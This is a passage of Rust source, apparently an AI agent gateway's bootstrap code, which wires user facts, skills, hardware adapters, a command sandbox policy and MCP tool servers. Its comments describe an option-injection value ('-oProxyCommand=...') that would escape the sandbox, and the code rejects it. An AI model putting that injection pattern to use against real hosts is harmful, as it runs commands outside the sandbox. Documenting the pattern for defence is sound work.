                min_chars = policy.min_chars(),
                extras = config.memory.ingestion.extra_noise_phrases.len(),
                "filtro de ruido da memoria ativo: turno curto ou puramente \
                 social e gravado sem vetor (#952). Desligue em \
                 `memory.ingestion.filter_noise` se quiser embeddar tudo."
            );
        } else {
            info!("filtro de ruido da memoria desligado por config (#952)");
        }
        runtime.set_noise_policy(policy);
    }

    // TODO 2026-09-02: knobs do auto-learning de fatos (`memory.auto_extract`
    // / `memory.max_facts`). Default preserva o comportamento histórico.
    {
        let auto = config.memory.auto_extract;
        let max = config.memory.max_facts;
        runtime.set_memory_extraction_policy(auto, max);
        if !auto {
            info!(
                "auto-learning de fatos desligado por config (memory.auto_extract=false) — \
                 uma chamada LLM a menos por turno"
            );
        } else if let Some(cap) = max {
            info!(
                cap,
                "teto de fatos aprendidos por turno ativo (memory.max_facts)"
            );
        }
    }

    // Wire tools_model: model override used when tools are present (e.g. avoids openrouter/free
    // which may not support function calling).
    if let Some(ref tm) = config.agent.tools_model {
        runtime.set_tools_model(Some(tm.clone()));
        info!(tools_model = %tm, "tools_model configured for tool-capable requests");
    }

    // --- Skills ---
    let skills_dir = garraia_config::ConfigLoader::default_config_dir().join("skills");
    let scanner = garraia_skills::SkillScanner::new(&skills_dir);
    match scanner.discover() {
        Ok(skills) if !skills.is_empty() => {
            let mut skill_block = String::from("\n\n# Active Skills\n");
            for skill in &skills {
                skill_block.push_str(&format!(
                    "\n## {}\n{}\n",
                    skill.frontmatter.name, skill.frontmatter.description
                ));
                if !skill.frontmatter.triggers.is_empty() {
                    skill_block.push_str(&format!(
                        "Triggers: {}\n",
                        skill.frontmatter.triggers.join(", ")
                    ));
                }
                skill_block.push('\n');
                skill_block.push_str(&skill.body);
                skill_block.push('\n');
            }

            let new_prompt = match runtime.system_prompt() {
                Some(existing) => format!("{existing}{skill_block}"),
                None => skill_block,
            };
            runtime.set_system_prompt(new_prompt);
            info!("injected {} skill(s) into system prompt", skills.len());
        }
        Ok(_) => {} // no skills found
        Err(e) => warn!("failed to scan skills directory: {e}"),
    }

    // --- Facts (User Information) ---
    let facts_path = garraia_config::ConfigLoader::default_config_dir()
        .join("memoria")
        .join("fatos.json");
    if facts_path.exists() {
        match std::fs::read_to_string(&facts_path) {
            Ok(content) => {
                match serde_json::from_str::<serde_json::Value>(&content) {
                    Ok(facts) => {
                        // Validate: must be a JSON object with at least one key
                        if !facts.is_object() {
                            warn!(
                                path = %facts_path.display(),
                                "facts.json is not a JSON object, skipping — expected {{ \"nome\": ..., \"sobre\": ... }}"
                            );
                        } else if facts.as_object().is_none_or(|o| o.is_empty()) {
                            warn!(
                                path = %facts_path.display(),
                                "facts.json is an empty object {{}}, skipping injection"
                            );
                        } else {
                            // Build facts context for system prompt
                            let mut facts_context = String::from("\n\n# Fatos do Usuário\n");

                            // Nome
                            if let Some(nome) = facts.get("nome").and_then(|v| v.as_str())
                                && !nome.is_empty()
                            {
                                facts_context.push_str(&format!("Nome: {}\n", nome));
                            }
                            // Apelido
                            if let Some(apelido) = facts.get("apelido").and_then(|v| v.as_str())
                                && !apelido.is_empty()
                            {
                                facts_context.push_str(&format!("Apelido: {}\n", apelido));
                            }
                            // Sobre
                            if let Some(sobre) = facts.get("sobre").and_then(|v| v.as_str())
                                && !sobre.is_empty()
                            {
                                facts_context.push_str(&format!("Sobre: {}\n", sobre));
                            }
                            // Empresa
                            if let Some(empresa) = facts.get("empresa").and_then(|v| v.as_str())
                                && !empresa.is_empty()
                            {
                                facts_context.push_str(&format!("Empresa: {}\n", empresa));
                            }
                            // Cargo
                            if let Some(cargo) = facts.get("cargo").and_then(|v| v.as_str())
                                && !cargo.is_empty()
                            {
                                facts_context.push_str(&format!("Cargo: {}\n", cargo));
                            }
                            // Localização
                            if let Some(local) =
                                facts.get("localizacao").and_then(|v| v.as_object())
                            {
                                let mut parts = Vec::new();
                                if let Some(v) = local.get("cidade").and_then(|v| v.as_str())
                                    && !v.is_empty()
                                {
                                    parts.push(v.to_string());
                                }
                                if let Some(v) = local.get("estado").and_then(|v| v.as_str())
                                    && !v.is_empty()
                                {
                                    parts.push(v.to_string());
                                }
                                if let Some(v) = local.get("pais").and_then(|v| v.as_str())
                                    && !v.is_empty()
                                {
                                    parts.push(v.to_string());
                                }
                                if !parts.is_empty() {
                                    facts_context
                                        .push_str(&format!("Localização: {}\n", parts.join(", ")));
                                }
                            }
                            // Idiomas
                            if let Some(idioma) =
                                facts.get("idioma_principal").and_then(|v| v.as_str())
                            {
                                facts_context.push_str(&format!("Idioma principal: {}\n", idioma));
                            }
                            if let Some(idiomas) =
                                facts.get("idiomas_secundarios").and_then(|v| v.as_array())
                            {
                                let langs: Vec<&str> =
                                    idiomas.iter().filter_map(|v| v.as_str()).collect();
                                if !langs.is_empty() {
                                    facts_context.push_str(&format!(
                                        "Idiomas secundarios: {}\n",
                                        langs.join(", ")
                                    ));
                                }
                            }
                            // Preferências
                            if let Some(prefs) =
                                facts.get("preferencias").and_then(|v| v.as_object())
                            {
                                facts_context.push_str("Preferências:\n");
                                if let Some(v) = prefs.get("idioma").and_then(|v| v.as_str()) {
                                    facts_context.push_str(&format!("  - Idioma: {}\n", v));
                                }
                                if let Some(v) = prefs.get("tom").and_then(|v| v.as_str()) {
                                    facts_context.push_str(&format!("  - Tom: {}\n", v));
                                }
                                if let Some(v) = prefs.get("nivel_detalhe").and_then(|v| v.as_str())
                                {
                                    facts_context
                                        .push_str(&format!("  - Nivel de detalhe: {}\n", v));
                                }
                                if let Some(v) =
                                    prefs.get("formato_resposta").and_then(|v| v.as_str())
                                {
                                    facts_context.push_str(&format!("  - Formato: {}\n", v));
                                }
                            }
                            // Ambiente
                            if let Some(amb) = facts.get("ambiente").and_then(|v| v.as_object()) {
                                facts_context.push_str("Ambiente:\n");
                                if let Some(v) =
                                    amb.get("sistema_operacional").and_then(|v| v.as_str())
                                {
                                    facts_context.push_str(&format!("  - SO: {}\n", v));
                                }
                                if let Some(v) = amb.get("usa_ollama").and_then(|v| v.as_bool()) {
                                    facts_context.push_str(&format!(
                                        "  - Usa Ollama: {}\n",
                                        if v { "Sim" } else { "Nao" }
                                    ));
                                }
                                if let Some(v) = amb.get("usa_openrouter").and_then(|v| v.as_bool())
                                {
                                    facts_context.push_str(&format!(
                                        "  - Usa OpenRouter: {}\n",
                                        if v { "Sim" } else { "Nao" }
                                    ));
                                }
                                if let Some(v) =
                                    amb.get("usa_modelos_locais").and_then(|v| v.as_bool())
                                {
                                    facts_context.push_str(&format!(
                                        "  - Modelos locais: {}\n",
                                        if v { "Sim" } else { "Nao" }
                                    ));
                                }
                            }
                            // Interesses
                            if let Some(interesses) =
                                facts.get("interesses").and_then(|v| v.as_array())
                            {
                                let interesses: Vec<&str> =
                                    interesses.iter().filter_map(|v| v.as_str()).collect();
                                if !interesses.is_empty() {
                                    facts_context.push_str(&format!(
                                        "Interesses: {}\n",
                                        interesses.join(", ")
                                    ));
                                }
                            }
                            // Projetos
                            if let Some(projetos) = facts.get("projetos").and_then(|v| v.as_array())
                            {
                                let projetos: Vec<&str> =
                                    projetos.iter().filter_map(|v| v.as_str()).collect();
                                if !projetos.is_empty() {
                                    facts_context
                                        .push_str(&format!("Projetos: {}\n", projetos.join(", ")));
                                }
                            }
                            // Restrições
                            if let Some(rest) = facts.get("restricoes").and_then(|v| v.as_object())
                            {
                                facts_context.push_str("Restricoes:\n");
                                if let Some(v) = rest.get("nao_alucinar").and_then(|v| v.as_bool())
                                {
                                    facts_context.push_str(&format!(
                                        "  - Nao alucinar: {}\n",
                                        if v { "Sim" } else { "Nao" }
                                    ));
                                }
                                if let Some(v) =
                                    rest.get("priorizar_precisao").and_then(|v| v.as_bool())
                                {
                                    facts_context.push_str(&format!(
                                        "  - Priorizar precisao: {}\n",
                                        if v { "Sim" } else { "Nao" }
                                    ));
                                }
                                if let Some(v) = rest
                                    .get("priorizar_respostas_tecnicas")
                                    .and_then(|v| v.as_bool())
                                {
                                    facts_context.push_str(&format!(
                                        "  - Respostas tecnicas: {}\n",
                                        if v { "Sim" } else { "Nao" }
                                    ));
                                }
                            }
                            // Fatos importantes
                            if let Some(fatos) =
                                facts.get("fatos_importantes").and_then(|v| v.as_array())
                                && !fatos.is_empty()
                            {
                                facts_context.push_str("Fatos importantes:\n");
                                for fato in fatos {
                                    if let Some(f) = fato.as_str() {
                                        facts_context.push_str(&format!("- {}\n", f));
                                    }
                                }
                            }

                            // Inject facts into system prompt
                            let new_prompt = match runtime.system_prompt() {
                                Some(existing) => format!("{}\n{}", existing, facts_context),
                                None => facts_context.clone(),
                            };
                            runtime.set_system_prompt(new_prompt);
                            info!(
                                "loaded user facts from {} ({} keys, context len: {})",
                                facts_path.display(),
                                facts.as_object().map_or(0, |o| o.len()),
                                facts_context.len()
                            );
                        }
                    }
                    Err(e) => {
                        warn!(
                            path = %facts_path.display(),
                            error = %e,
                            "facts.json contains invalid JSON, skipping — boot continues normally"
                        );
                    }
                }
            }
            Err(e) => {
                warn!("failed to read facts file: {}", e);
            }
        }
    }

    runtime
}

/// Sobe os adapters de hardware configurados (#1126 MQTT, #1127 Home
/// Assistant) quando houver secao `hardware.mqtt` ou
/// `hardware.home_assistant` no config.
///
/// Chamado pelo gateway **e** pela CLI (`garra chat`) — e a fonte unica do
/// wiring: resolucao de segredos, caminho do store de presenca e o fato de
/// gateway e CLI abrirem o MESMO store moram aqui, nao em copias que
/// divergem. A CLI chama via
/// `garraia_gateway::bootstrap::spawn_hardware_adapters`.
///
/// O store de presenca abre **uma vez**, compartilhado entre adapters: os
/// dois alimentam a mesma fonte de online/offline que as tools de device
/// mostram. `None` quando nao ha nenhuma secao de hardware no config, ou
/// quando o store nao abre (nenhum adapter sobe sem presenca).
///
/// O barramento de eventos (#1128) nasce aqui e os adapters publicam nele
/// o que veem; o motor de automacoes assina quando `hardware.automations`
/// esta configurado (regras do dir, auditoria em `automations.db`, teto de
/// risco do config). Automations sem nenhum adapter configurado nao sobe —
/// nenhum evento chegaria ao barramento — e o warn diz isso.
///
/// Fail-soft no boot: qualquer problema (broker malformado, `password_env`/
/// `token_env` apontando para env vazia ou inexistente, URL vetada recusada
/// pelo guard SSRF) nao derruba o processo — o registry segue com os
/// dispositivos dos adapters que subiram, e cada warn diz o que faltou.
/// `garra config check` mostra os mesmos erros de config — comando
/// **opt-in**: nada no boot do gateway invoca o `run_check`, entao o
/// diagnostico depende do operador rodar (ver issue #1247).
///
/// Precisa de runtime tokio (spawn dos event loops) — gateway e CLI chamam
/// de dentro de `run()` async. Sem secao `hardware.*`, retorna antes de
/// tocar tokio, seguro para testes.
pub fn spawn_hardware_adapters(
    config: &AppConfig,
    registry: Arc<DeviceRegistry>,
) -> Option<Arc<DeviceStateStore>> {
    if config.hardware.mqtt.is_none() && config.hardware.home_assistant.is_none() {
        if config.hardware.automations.is_some() {
            warn!(
                "hardware: automations configurado sem nenhum adapter (mqtt/home_assistant); \
                 o motor nao sobe porque nenhum evento chegaria ao barramento"
            );
        }
        return None;
    }

    // Presenca no mesmo padrao do memory.db: fonte unica da resolucao em
    // `AppConfig::hardware_db_path`, porque gateway e CLI abrem o mesmo
    // arquivo. O diretorio precisa existir antes de abrir o SQLite — o boot
    // da memoria cria o dele, mas o hardware pode rodar sem memoria ligada.
    let state_path = config.hardware_db_path();
    if let Some(parent) = state_path.parent()
        && let Err(e) = std::fs::create_dir_all(parent)
    {
        warn!(
            "hardware: nao consegui criar {} ({e}); nenhum adapter de hardware sobe",
            parent.display()
        );
        return None;
    }
    let state = match DeviceStateStore::abrir_em(&state_path) {
        Ok(store) => Arc::new(store),
        Err(e) => {
            warn!(
                "hardware: nao abri o store de presenca em {} ({e}); nenhum adapter de hardware sobe",
                state_path.display()
            );
            return None;
        }
    };

    // Barramento de eventos (#1128): adapters publicam o que veem e o motor
    // de automacoes assina. Publicar sem assinante custa zero (o canal
    // descarta), entao ele existe sempre que ha hardware no ar.
    let bus = Arc::new(HardwareEventBus::nova());

    // Cada adapter decide sozinho se sobe e explica o que faltou. O
    // operador pode ter os dois, um so, ou nenhum — o registry soma.
    let mut algum_no_ar = false;
    algum_no_ar |= sobe_mqtt(config, registry.clone(), state.clone(), Some(bus.clone()));
    algum_no_ar |= sobe_home_assistant(config, registry.clone(), state.clone(), Some(bus.clone()));

    // O motor de automacoes (#1128) arma por conta do config, independente
    // de quantos adapters subiram — cada falha anterior ja teve o seu warn.
    sobe_automacoes(config, bus, registry);

    algum_no_ar.then_some(state)
}

/// Traduz a secao `agent.sandbox` (#1225) para a `SandboxPolicy` que o
/// `BashTool` consulta a cada comando.
///
/// Mora aqui, e nao numa das duas crates de origem, porque
/// `garraia-config` e `garraia-agents` nao se conhecem — nenhuma das duas
/// depende da outra, e criar essa aresta so para uma conversao seria pior do
/// que centraliza-la no unico lugar que ja ve as duas. Gateway e CLI chamam
/// esta mesma funcao (`garraia_gateway::bootstrap::sandbox_policy_from`),
/// pelo mesmo motivo que chamam `spawn_hardware_adapters`: fonte unica do
/// wiring, sem copias que divergem.
///
/// Fail-closed nas duas bordas que podem dar errado:
///
/// - `backend = ssh` sem `ssh_host` **nao** vira backend nenhum. A policy
///   fica com `backend: None`, e `wrap_command` recusa cada comando em vez
///   de escolher um backend por conta propria ou cair para o host. O
///   `garra config check` reporta isso como Error, mas e comando opt-in e
///   nao gate de boot — nada no boot o invoca —, entao a recusa que vale e
///   esta aqui, mais o `warn!` para quem subiu assim mesmo.
/// - `image` vazia ou so espacos e tratada como ausente, caindo no default
///   da propria `SandboxPolicy` — nunca vira `-v ... '' sh -lc ...`.
/// - `ssh_host` ou `image` **comecando com `-`** sao recusados. `sh_quote`
///   garante um token unico, o que impede injecao de comando; nao impede
///   injecao de OPCAO. O host fica ANTES do `--` em `ssh {host} -- sh -lc`,
///   entao `-oProxyCommand=...` e lido como flag e executa no host LOCAL,
///   pulando o `safety_gate` — o inverso exato do proposito do sandbox. O
///   mesmo vale para `image`, posicional do `docker run`. Nenhum host e
///   nenhuma imagem de verdade comeca com `-`, entao recusar e barato.
///   Esta e a camada que garante a propriedade no boot, junto com o
///   proprio `wrap_command`; o `config check` **reporta** o mesmo Error,
///   mas e comando opt-in, nao gate de boot. O conserto estrutural (montar
///   argv em vez de linha de shell) e acompanhamento na #1225 (slices
///   S2/S3), como ja recomendado na #1231.
/// - Nomes em `sandboxed_tools`/`elevated` sao trimados. A comparacao na
///   policy e exata, entao `" bash"` no YAML seria um no-op silencioso.
///   Maiusculas NAO sao normalizadas: o registry de tools e case-sensitive.
///
/// Com a secao ausente (`mode = off`, o default), devolve exatamente
/// `SandboxPolicy::default()`: zero mudanca de comportamento.
pub fn sandbox_policy_from(cfg: &garraia_config::SandboxConfig) -> SandboxPolicy {
    use garraia_config::sandbox::parece_opcao;
    use garraia_config::{SandboxBackendKind, SandboxMode as CfgMode};

    let mode = match cfg.mode {
        CfgMode::Off => SandboxMode::Off,
        CfgMode::All => SandboxMode::All,
        CfgMode::Allowlist => SandboxMode::Allowlist,
    };
    // Decidido aqui, e nao no ponto de uso, porque `mode` e movido para dentro
    // da `SandboxPolicy` construida no fim. Gate dos dois `warn!` abaixo: com a
    // secao desligada o `validate_sandbox` retorna cedo e nao diz nada, e as
    // duas camadas nao podem discordar sobre o mesmo estado.
    let sandbox_ativo = mode != SandboxMode::Off;

    let backend = match cfg.backend {
        None => None,
        Some(SandboxBackendKind::Docker) => Some(SandboxBackend::Docker),
        Some(SandboxBackendKind::Podman) => Some(SandboxBackend::Podman),
        Some(SandboxBackendKind::Ssh) => match cfg.ssh_host.as_deref().map(str::trim) {
            Some(host) if !host.is_empty() && !parece_opcao(host) => {
                Some(SandboxBackend::Ssh(host.to_string()))
            }
            outro => {
                if sandbox_ativo {
                    // O valor NUNCA entra no log: um `-oProxyCommand=...`
                    // carrega o comando do atacante, e o log e lido por
                    // humano e por ferramenta.
                    warn!(
                        recusado_por = if outro.is_some_and(parece_opcao) {
                            "comeca com `-` (seria lido como opcao do ssh, nao como host)"
                        } else {
                            "ausente ou vazio"
                        },
                        "agent.sandbox.backend=ssh sem ssh_host utilizavel: nenhum backend sera \
                         construido e todo comando sandboxado falha fechado (veja \
                         `garra config check`)"
                    );
                }
                None
            }
        },
    };

    let padrao = SandboxPolicy::default();
    SandboxPolicy {
        mode,
        sandboxed_tools: nomes_de_tool(&cfg.sandboxed_tools),
        backend,
        image: match cfg.image.as_deref().map(str::trim) {
            Some(img) if !img.is_empty() && !parece_opcao(img) => img.to_string(),
            Some(img) if parece_opcao(img) => {
                // Gated como o aviso do `ssh_host`. A imagem cai no default
                // de qualquer jeito; o que o gate controla e so o ruido.
                if sandbox_ativo {
                    warn!(
                        "agent.sandbox.image comeca com `-` e seria lida como opcao do \
                         docker/podman em vez de nome de imagem; usando a imagem padrao (veja \
                         `garra config check`)"
                    );
                }
                padrao.image
            }
            _ => padrao.image,
        },
        elevated: nomes_de_tool(&cfg.elevated),
        mount_workdir: cfg.mount_workdir,
        network_disabled: cfg.network_disabled,
    }
}

/// Nomes de tool trimados, sem entradas vazias.
///
/// A `SandboxPolicy` compara nome por igualdade exata, entao `" bash"` vindo
/// de uma lista YAML seria um item que existe no arquivo e nao existe para o
/// codigo. Caixa nao e normalizada de proposito — o registry de tools e
/// case-sensitive, e "consertar" `Bash` aqui esconderia o erro do operador
/// em vez de o `config check` o apontar.
fn nomes_de_tool(entradas: &[String]) -> Vec<String> {
    entradas
        .iter()
        .map(|t| t.trim())
        .filter(|t| !t.is_empty())
        .map(str::to_string)
        .collect()
}

/// Sobe o adapter MQTT (#1126) quando `hardware.mqtt` esta configurado.
/// Publica presenca e estado no barramento (`bus`) que o motor de
/// automacoes (#1128) assina. Fail-soft: cada problema vira warn e devolve
/// `false` — o deploy segue no ar, sem o transporte.
fn sobe_mqtt(
    config: &AppConfig,
    registry: Arc<DeviceRegistry>,
    state: Arc<DeviceStateStore>,
    bus: Option<Arc<HardwareEventBus>>,
) -> bool {
    let Some(mqtt) = config.hardware.mqtt.as_ref() else {
        return false;
    };

    // A senha vem do env apontado por `password_env` e nunca e logada — o
    // warn cita so o NOME da env, que nao e segredo. Configurada e vazia/
    // ausente e falha de deploy, nao motivo para conectar anonimo: o broker
    // recusaria depois, com reconnect em loop e sem mensagem clara.
    let password = match &mqtt.password_env {
        Some(env_name) => match std::env::var(env_name) {
            Ok(value) if !value.is_empty() => Some(value),
            _ => {
                warn!(
                    env = env_name,
                    "hardware.mqtt: password_env aponta para env vazia ou inexistente; \
                     adapter MQTT nao sobe e o registry de dispositivos fica vazio"
                );
                return false;
            }
        },
        None => None,
    };

    let adapter_config = match MqttAdapterConfig::new(&mqtt.broker, mqtt.username.clone(), password)
    {
        Ok(cfg) => cfg,
        Err(e) => {
            warn!(
                "hardware.mqtt: {e}; adapter MQTT nao sobe e o registry de dispositivos fica vazio (veja `garra config check`)"
            );
            return false;
        }
    };

    // Client id unico por processo: gateway e `garra chat` no mesmo host
    // conectam ao mesmo broker, e dois clientes com o mesmo id se des
    // conectam em loop — o pid completa a unicidade do prefixo.
    let adapter_config =
        adapter_config.com_client_id(format!("{}-{}", mqtt.client_id_prefix, std::process::id()));

    // O handle do manager fica solto de proposito: o event loop vive pela
    // vida do processo (reconnect do rumqttc e interno), e o reload de
    // config que o pararia e trabalho da #1128.
    if let Err(e) = MqttAdapterManager::spawn(adapter_config, registry, Some(state), bus) {
        warn!("hardware.mqtt: {e}; adapter MQTT nao sobe e o registry de dispositivos fica vazio");
        return false;
    }

    info!(
        broker = %mqtt.broker,
        "hardware.mqtt no ar — descoberta via manifestos retained, presenca no store"
    );
    true
}

/// Sobe o adapter Home Assistant (#1127) quando `hardware.home_assistant`
/// esta configurado — REST (descoberta `/api/states`, leitura, servicos) +
/// WebSocket (`state_changed` → presenca + barramento #1128), tudo atras do
/// guard SSRF (`IpScope::AllowPrivate`: hub na LAN/loopback e alvo
/// legitimo). As entidades viram dispositivos com risco por dominio:
/// sensor/binary_sensor R0, light/switch/climate R1, cover R2, lock R3.
///
/// O token vem do env apontado por `token_env` (write-only: nunca logado,
/// o warn cita so o NOME da env). Fail-soft igual ao MQTT.
fn sobe_home_assistant(
    config: &AppConfig,
    registry: Arc<DeviceRegistry>,
    state: Arc<DeviceStateStore>,
    bus: Option<Arc<HardwareEventBus>>,
) -> bool {
    let Some(ha) = config.hardware.home_assistant.as_ref() else {
        return false;
    };

    let token = match std::env::var(&ha.token_env) {
        Ok(value) if !value.is_empty() => value,
        _ => {
            warn!(
                env = %ha.token_env,
                "hardware.home_assistant: token_env aponta para env vazia ou inexistente; \
                 adapter Home Assistant nao sobe e o registry de dispositivos fica vazio"
            );
            return false;
        }
    };

    let adapter_config = match HaAdapterConfig::new(&ha.url, token) {
        Ok(cfg) => cfg,
        Err(e) => {
            warn!(
                "hardware.home_assistant: {e}; adapter nao sobe e o registry de dispositivos fica vazio (veja `garra config check`)"
            );
            return false;
        }
    };

    // O handle do manager fica solto de proposito: o loop vive pela vida do
    // processo (reconexao do WebSocket e interna), e o reload de config que
    // o pararia e trabalho da #1128.
    HaAdapterManager::spawn(adapter_config, registry, Some(state), bus);
    info!(
        url = %ha.url,
        "hardware.home_assistant no ar — descoberta por /api/states, presenca por eventos state_changed"
    );
    true
}

/// Arma o motor de automacoes (#1128) quando `hardware.automations` esta
/// configurado: regras compiladas do dir (TOML/JSON), auditoria em
/// `automations.db` e o teto de risco do config. Fail-soft igual aos
/// adapters — cada problema vira warn e o boot segue sem o motor. Regra
/// quebrada nunca derruba o deploy, mas tambem nunca sobe silenciosa.
fn sobe_automacoes(config: &AppConfig, bus: Arc<HardwareEventBus>, registry: Arc<DeviceRegistry>) {
    let Some(dir) = config.automations_dir() else {
        return; // sem secao no config — o motor nao sobe (fail-closed)
    };

    // Auditoria e pre-condicao do motor: execucao sem auditoria quebraria
    // o contrato #1128, entao sem store nao ha motor. O diretorio do
    // `automations.db` e o mesmo do store de presenca, ja criado acima.
    let store_path = config.automations_db_path();
    let store = match AutomationStore::abrir_em(&store_path) {
        Ok(store) => Arc::new(store),
        Err(e) => {
            warn!(
                "hardware.automations: nao abri a auditoria em {} ({e}); motor nao sobe",
                store_path.display()
            );
            return;
        }
    };

    // Regras do dir: arquivo quebrado nomeia o arquivo no erro, e dir
    // ausente tambem e erro — o operador declarou `dir`, e "nenhuma regra
    // no ar" tem que ser dito, nao presumido.
    let specs = match carregar_automacoes(&dir) {
        Ok(specs) => specs,
        Err(e) => {
            warn!(
                "hardware.automations: {e} — regras de {}; motor nao sobe com spec quebrada",
                dir.display()
            );
            return;
        }
    };

    // Teto do config, com o default r1 do schema se ausente. `de_texto` so
    // aceita r0/r1/r2: texto invalido cai no default r1 sem warn. O
    // `garra config check` (opt-in — nao e gate de boot) reporta Error para
    // R3+; o default aqui e a camada viva (issue #1247).
    let teto = config
        .automations_risk_ceiling()
        .and_then(TetoRisco::de_texto)
        .unwrap_or(TetoRisco::R1);

    // O handle fica solto de proposito — o motor vive pela vida do
    // processo, igual aos event loops dos adapters.
    if let Err(e) = AutomationEngine::spawn(EngineConfig { specs, teto }, bus, registry, store) {
        warn!("hardware.automations: {e}; motor nao sobe");
        return;
    }
    info!(
        regras = %dir.display(),
        teto = teto.as_str(),
        "hardware.automations no ar — regras compiladas, motor assinando o barramento"
    );
}

/// Build MCP tools from merged config (config.yml + mcp.json).
///
/// Returns the manager, a flat list of bridged tools ready for registration,
/// and the servers that failed to connect as `(name, error)` pairs so the
/// caller can surface them (registry status, admin UI) instead of the
/// failures living only in a warn! line.
pub async fn build_mcp_tools(
    config: &AppConfig,
) -> (Arc<McpManager>, Vec<Box<dyn Tool>>, Vec<(String, String)>) {
    let loader = match garraia_config::ConfigLoader::new() {
        Ok(l) => l,
        Err(e) => {
            warn!("failed to create config loader for MCP: {e}");
            return (Arc::new(McpManager::new()), Vec::new(), Vec::new());
        }
    };

    let mcp_configs = loader.merged_mcp_config(config);
    if mcp_configs.is_empty() {
        // Explicit log: "nothing configured" used to be indistinguishable
        // from "config file in another directory was silently ignored".
        info!(
            config_dir = %loader.config_dir().display(),
            config_yml_mcp = config.mcp.len(),
            "no MCP servers configured (checked mcp.json and the 'mcp:' section of config.yml in this directory)"
        );
        return (Arc::new(McpManager::new()), Vec::new(), Vec::new());
    }

    let manager = Arc::new(McpManager::new());
    let mut all_tools: Vec<Box<dyn Tool>> = Vec::new();
    let mut failures: Vec<(String, String)> = Vec::new();

    for (name, server_config) in &mcp_configs {
        let enabled = server_config.enabled.unwrap_or(true);
        if !enabled {
            info!("MCP server '{name}' is disabled, skipping");
            continue;
        }

        let timeout_secs = server_config
            .timeout
            .unwrap_or(config.timeouts.mcp.default_secs);
        // GAR-293: resource limit config (with defaults).
        let memory_limit_mb = server_config.memory_limit_mb;
        let max_restarts = server_config.max_restarts.unwrap_or(5);
        let restart_delay_secs = server_config.restart_delay_secs.unwrap_or(5);

        let connect_result = match server_config.transport.as_str() {
            "stdio" => {
                // #1274: `command` is `#[serde(default)]`, so an empty one no
                // longer fails to deserialize — refuse it here before it
                // reaches a spawn. This arm also catches a `url`-only entry
                // whose `transport` was left to its default; the loader keeps
                // those (an HTTP server declared without the field), so the
                // entry stays reachable for the admin restart's allowlist
                // resolution even though it cannot boot as stdio.
                if server_config.command.trim().is_empty() {
                    warn!(
                        "MCP server '{name}' uses stdio transport but no 'command' configured, skipping"
                    );
                    continue;
                }
                manager
                    .connect(
                        name,
                        &server_config.command,
                        &server_config.args,
                        &server_config.env,
                        timeout_secs,
                        server_config.allowed_tools.clone(),
                        memory_limit_mb,
                        max_restarts,
                        restart_delay_secs,
                        server_config.inherit_env,
                    )
                    .await
            }
            #[cfg(feature = "mcp-http")]
            "http" => {
                let Some(url) = &server_config.url else {
                    warn!(
                        "MCP server '{name}' uses HTTP transport but no 'url' configured, skipping"
                    );
                    continue;
                };
                manager
                    .connect_http(
                        name,
                        url,
                        timeout_secs,
                        server_config.allowed_tools.clone(),
                        max_restarts,
                        restart_delay_secs,
                    )
                    .await
            }
            other => {
                warn!("MCP server '{name}' uses unsupported transport '{other}', skipping");
                continue;
            }
        };

        match connect_result {
            Ok(()) => {
                let tools = manager
                    .take_tools(name, std::time::Duration::from_secs(timeout_secs))
                    .await;
                info!("MCP server '{name}': registered {} tool(s)", tools.len());
                all_tools.extend(tools);
            }
            Err(e) => {
                warn!("failed to connect MCP server '{name}': {e}");
                failures.push((name.clone(), e.to_string()));
                // Boot failures used to be terminal: the server never entered
                // `connections`, so the health monitor could not see it and
                // only a manual admin restart recovered it. Queue it for the
                // same backoff-driven retry as a crashed connection.
                //
                // Issue #1242: this used to be `if transport == "stdio"`, and
                // the `allowed_tools` of an HTTP server that failed its boot
                // handshake therefore survived nowhere — not in
                // `connections`, not in `pending`, and not in the gateway's
                // registry type, which has no such field. The first admin
                // restart of that server reconnected it with no allowlist at
                // all. Parking it here is what makes the restart handler's
                // `Manager` branch able to answer for HTTP too.
                //
                // `inherit_env` (#1236) travels with the stdio arm only, and
                // that is not an oversight: HTTP transport spawns no child
                // process, so there is no environment to inherit or withhold.
                // `register_pending_http` has no such parameter.
                match server_config.transport.as_str() {
                    "stdio" => {
                        manager
                            .register_pending_stdio(
                                name,
                                &server_config.command,
                                &server_config.args,
                                &server_config.env,
                                timeout_secs,
                                server_config.allowed_tools.clone(),
                                memory_limit_mb,
                                max_restarts,
                                restart_delay_secs,
                                server_config.inherit_env,
                            )
                            .await;
                    }
                    #[cfg(feature = "mcp-http")]
                    "http" => {
                        if let Some(url) = &server_config.url {
                            manager
                                .register_pending_http(
                                    name,
                                    url,
                                    timeout_secs,
                                    server_config.allowed_tools.clone(),
                                    max_restarts,
                                    restart_delay_secs,
                                )
                                .await;
                        }
                    }
                    _ => {}
                }
            }
        }
    }

    (manager, all_tools, failures)
}

/// Build a voice handler for Telegram that processes voice messages.
/// Constroi o provider de embeddings declarado na config, ja envelopado no
/// [`ResilientEmbeddingProvider`] (#962, #961).
///
/// Extraido de [`build_agent_runtime`] para que a CLI possa pedir **o mesmo**
/// provider que o gateway usa sem subir um runtime inteiro (e sem abrir uma
/// segunda conexao no `memory.db`) — `garra memory reindex` (#953) grava
/// vetores que o recall do gateway vai ler, entao os dois lados precisam
/// concordar na resolucao da chave, no timeout proprio e na dimensao validada.
/// Construir um segundo provider por fora era exatamente a divergencia
/// silenciosa que este projeto ja pagou caro.
///
/// Devolve `None` quando `memory.embedding_provider` nao aponta para nenhuma
/// entrada de `embeddings:`, ou quando o provider apontado nao pode ser
/// construido (sem credencial contra endpoint oficial, tipo desconhecido).
/// A politica de ruido da ingestao (#952), a partir da config.
///
/// Publica pela mesma razao que [`build_embedding_provider`]: o `garra memory
/// reindex` precisa da **mesma** politica que a ingestao usou. Com politicas
/// divergentes, o reindex reembeddaria exatamente as entradas que a ingestao
/// acabou de pular — e o operador pagaria provider para desfazer o filtro.
pub fn noise_policy_from_config(config: &AppConfig) -> NoisePolicy {
    let i = &config.memory.ingestion;
    NoisePolicy::new(i.filter_noise, i.min_chars, &i.extra_noise_phrases)
}

pub fn build_embedding_provider(config: &AppConfig) -> Option<Arc<dyn EmbeddingProvider>> {
    let embed_name = config.memory.embedding_provider.as_ref()?;
    let embed_config = config.embeddings.get(embed_name)?;

    let embed_client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(
            config.timeouts.embeddings.default_secs,
        ))
        .build()
        .unwrap_or_default();

    let built: Option<Arc<dyn EmbeddingProvider>> = match embed_config.provider.as_str() {
        // =====================================
        // COHERE
        // =====================================
        "cohere" => {
            let api_key = resolve_api_key(
                embed_config.api_key.as_deref(),
                "COHERE_API_KEY",
                "COHERE_API_KEY",
            );

            if let Some(key) = api_key {
